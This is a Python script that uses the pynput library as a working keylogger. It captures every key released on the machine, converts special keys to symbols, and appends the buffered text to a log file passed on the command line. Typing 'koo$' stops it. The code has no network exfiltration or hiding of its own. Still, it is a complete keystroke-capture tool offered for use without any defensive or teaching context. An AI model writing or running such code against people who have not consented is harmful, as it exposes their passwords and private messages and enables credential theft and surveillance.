'''
pip install pynput
'''

from pynput.keyboard import Listener, Key
import sys

line = ''
MAX_LETTERS = 50
# TEMP_FILE = 'D:\\\\keymap.log'
TEMP_FILE = sys.argv[1]
sequence = ''

switcher = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.backspace: '«',
    Key.shift_r: '',
    Key.shift: '',
    Key.alt_l: '',
    Key.alt_r: '',
    Key.ctrl_l: '',
    Key.ctrl_r: '',
    Key.up: '',
    Key.down: '',
    Key.left: '',
    Key.right: '',
    Key.delete: ' DEL ',
    Key.home: ' HOME ',
    Key.end: ' END '
}

def write_out():
    global line
    with open(TEMP_FILE, 'a') as f:
        f.write(line)
        line = ''


def build_line(key):
    global line
    global sequence

    if hasattr(key, 'char'):
        c = key.char
    else:
        # print(key.value)
        c = switcher.get(key, key.name)

    # Exit strategy
    sequence += c
    if sequence[-4:] == 'koo$':
        print('exiting...')
        write_out()
        sys.exit(0)

    sequence = sequence[-4:] if len(sequence) > 1000 else sequence
    # Exit strategy end
    line = line + c
    # print(c)

    if len(line) > MAX_LETTERS:
        write_out()


if __name__ == '__main__':
    try:
        with Listener(on_release=build_line) as listener:
            listener.join()
    except Exception as e:
        print(e.with_traceback())
        print('Exiting...')
    finally:
        print('In finally')
        write_out()

    print(sys.argv[1])
